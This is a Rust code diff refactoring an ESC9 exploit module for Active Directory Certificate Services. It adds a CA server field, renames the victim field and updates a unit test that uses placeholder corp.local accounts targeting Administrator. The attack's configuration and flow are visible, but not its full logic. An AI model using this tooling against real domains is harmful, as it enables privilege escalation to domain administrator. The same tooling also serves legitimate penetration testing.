@@ -49,10 +49,12 @@ pub struct Esc9Exploiter {
 /// Configuration for an ESC9 attack run
 #[derive(Debug, Clone)]
 pub struct Esc9Config {
+    /// CA web enrollment URL
+    pub ca_server: String,
     /// Certificate template vulnerable to ESC9 (has `CT_FLAG_NO_SECURITY_EXTENSION`)
     pub template: String,
     /// Account whose UPN we temporarily overwrite (must have GenericWrite rights)
-    pub victim_account: String,
+    pub victim: String,
     /// Distinguished Name of the victim account (required for live LDAP modification)
     pub victim_dn: String,
     /// Current / original UPN of the victim account (saved for restoration)
@@ -100,7 +102,7 @@ impl Esc9Exploiter {
     pub async fn exploit(&self, config: &Esc9Config) -> Result<Esc9Result> {
         info!(
             "ESC9 attack: template={}, victim={}, target_upn={}",
-            config.template, config.victim_account, config.target_upn
+            config.template, config.victim, config.target_upn
         );
 
         // Verify template is actually vulnerable (flag check)
@@ -153,7 +155,7 @@ impl Esc9Exploiter {
                 valid_from: "Unknown".to_string(),
                 valid_to: "Unknown".to_string(),
                 template: config.template.clone(),
-                subject: format!("CN={}", config.victim_account),
+                subject: format!("CN={}", config.victim),
                 issuer: self.web_client.base_url(),
                 public_key_algorithm: "RSA".to_string(),
                 signature_algorithm: "SHA256RSA".to_string(),
@@ -325,8 +327,9 @@ mod tests {
     #[test]
     fn test_generate_ldap_commands_contains_upn() {
         let config = Esc9Config {
+            ca_server: "ca.corp.local".to_string(),
             template: "UserTemplate".to_string(),
-            victim_account: "victim".to_string(),
+            victim: "victim".to_string(),
             victim_dn: "CN=victim,CN=Users,DC=corp,DC=local".to_string(),
             original_upn: "victim@corp.local".to_string(),
             target_upn: "Administrator@corp.local".to_string(),
